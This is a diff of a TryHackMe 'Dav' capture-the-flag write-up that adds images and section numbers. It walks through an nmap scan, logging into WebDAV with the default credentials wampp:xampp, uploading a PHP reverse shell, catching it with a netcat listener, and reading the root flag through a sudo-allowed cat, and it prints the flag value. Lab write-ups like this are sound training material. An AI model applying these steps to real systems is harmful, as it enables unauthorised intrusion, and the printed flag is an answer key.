@@ -1,3 +1,4 @@
+![](https://github.com/A3lpha/Write-Ups/blob/main/TryHackMe/Dav/images/Dav.png)
 # Dav
 
 # 1. scanning
@@ -75,14 +76,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 1138.60 seconds
 ~~~
 # 2 web enumiration
+![](https://github.com/A3lpha/Write-Ups/blob/main/TryHackMe/Dav/images/defaultweb.png)
 ~~~
 There is no `robots.txt` file that may have disclosed hidden locations, but dirsearch found a `/webdav/` directory, which requires an authentication.
 
 Searching for the terms `default credentials webdav` on Google leads to [this link](https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html) that applies to XAMPP, but why not giving it a try?
 Guess what? It worked with `wampp:xampp`!
 ~~~
-
-# webdav
+![](https://github.com/A3lpha/Write-Ups/blob/main/TryHackMe/Dav/images/after%20authentication.png)
+# 3. webdav
 
 ~~~
 ┌──(alpha㉿sploit)-[~/ctf/DAv]
@@ -122,7 +124,7 @@ passwd.dav: ASCII text
 wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
 
 ~~~
-# revershell
+# 4. revershell
 ~~~
 ┌──(alpha㉿sploit)-[~/ctf/DAv]
 └─$ locate php reverse
@@ -176,7 +178,8 @@ Progress: [=============================>] 100.0% of 5492 bytes succeeded.
 dav:/webdav/> quit
 Connection to `10.10.161.184' closed.
 ~~~
-# UserFlag
+![](https://github.com/A3lpha/Write-Ups/blob/main/TryHackMe/Dav/images/reverseshell.png)
+# 5. UserFlag
 ~~~
 ┌──(alpha㉿sploit)-[~/ctf/DAv]
 └─$ nc -nlvp 1900      
@@ -221,20 +224,9 @@ drwxrwxr-x 2 merlin merlin 4096 Aug 25  2019 .nano
 -rw-r--r-- 1 merlin merlin    0 Aug 25  2019 .sudo_as_admin_successful
 -rw-r--r-- 1 root   root    183 Aug 25  2019 .wget-hsts
 -rw-rw-r-- 1 merlin merlin   33 Aug 25  2019 user.txt
-www-data@ubuntu:/home/merlin$ sudo -l
-sudo -l
-Matching Defaults entries for www-data on ubuntu:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on ubuntu:
-    (ALL) NOPASSWD: /bin/cat
-www-data@ubuntu:/home/merlin$ sudo cat /root/root.txt
-sudo cat /root/root.txt
-101101ddc16b0cdf65ba0b8a7af7afa5
 www-data@ubuntu:/home/merlin$
 ~~~
-# rootflag
+# 6. rootflag
 ~~~
 www-data@ubuntu:/home/merlin$ sudo -l
 sudo -l
